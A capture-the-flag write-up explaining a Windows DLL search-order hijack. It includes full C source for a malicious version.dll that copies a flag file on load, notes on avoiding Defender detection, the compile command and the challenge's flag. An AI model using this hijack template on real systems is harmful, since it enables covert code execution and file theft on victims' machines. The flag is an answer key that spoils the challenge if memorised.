---
title: "Phantom DLL"
ctf: "OWASP KL CTF"
date: 2026-07-04
category: pwn / malware
difficulty: medium
points: 100
flag_format: "OWASPKL{...}"
author: "s1ght"
---

# Phantom DLL

## Summary

The challenge requires exploiting insecure Windows DLL search path ordering via Phantom DLL Proxying / Hijacking to exfiltrate a secret flag file from an automated evaluation sandbox. By naming our payload `version.dll` and implementing a synchronous file copy during DLL initialization, the target application loaded our malicious DLL and copied the secret flag file (`C:\flag.txt`) into `C:\output\stolen.txt`, which was subsequently echoed back by the status endpoint.

## Solution

### Step 1: Discovering the Detonation Exfiltration Mechanism

Analysis of the provided Windows disk image revealed that no interactive password login or hash cracking was required. Instead, the challenge relies on the remote **Valere Detonation Service** sandbox (`http://56.68.126.175:8000/`). 

When an uploaded DLL is detonated, the evaluation portal opens `C:\output\stolen.txt` inside the sandbox VM upon completion and returns whatever text was written inside that file to the user via `GET /status/<job_id>`. Since the target VM places the real challenge flag at `C:\flag.txt`, the payload only needs to copy `C:\flag.txt` into `C:\output\stolen.txt`.

### Step 2: Crafting the Stealthy `version.dll` Payload

To ensure reliable execution without getting blocked by Windows Defender heuristics (which flag `cmd.exe` or `WinExec` calls spawned from system DLLs) or triggering Loader Lock thread race conditions, the payload was written using native Win32 APIs and executed synchronously inside `DLL_PROCESS_ATTACH`. Furthermore, naming the library **`version.dll`** leverages a classic Windows DLL proxying target that almost all native Windows processes attempt to load from their working directory before checking `C:\Windows\System32`.

```c
#include <windows.h>

#define EXPORT __declspec(dllexport)

void RunPayload() {
    // Ensure output directory exists
    CreateDirectoryA("C:\\output", NULL);

    // Directly copy the secret flag file into the sandbox output path
    CopyFileA("C:\\flag.txt", "C:\\output\\stolen.txt", FALSE);
}

// Common exports expected by target applications
EXPORT void Initialize() {
    RunPayload();
}

EXPORT void SomeExportedFunc() {
    RunPayload();
}

EXPORT int Add(int a, int b) {
    RunPayload();
    return a + b;
}

// Main DLL Entry Point
BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        RunPayload();
    }
    return TRUE;
}
```

### Step 3: Compiling and Detonating the Exploit

We compiled the payload into a 64-bit Windows dynamic link library using `mingw-w64`:

```bash
x86_64-w64-mingw32-gcc -shared -o version.dll payload.c -m64 -O2 -s -lkernel32 -luser32
```

Upon submitting `version.dll` along with the player token to `/submit` and polling `/status/<job_id>`, the detonation service executed the hijacked DLL, copied `C:\flag.txt` to `C:\output\stolen.txt`, and returned the actual flag in the JSON response.

## Flag

```
OWASPKL{2c5f5b16dd2adfa60215ecc072881b66}
```
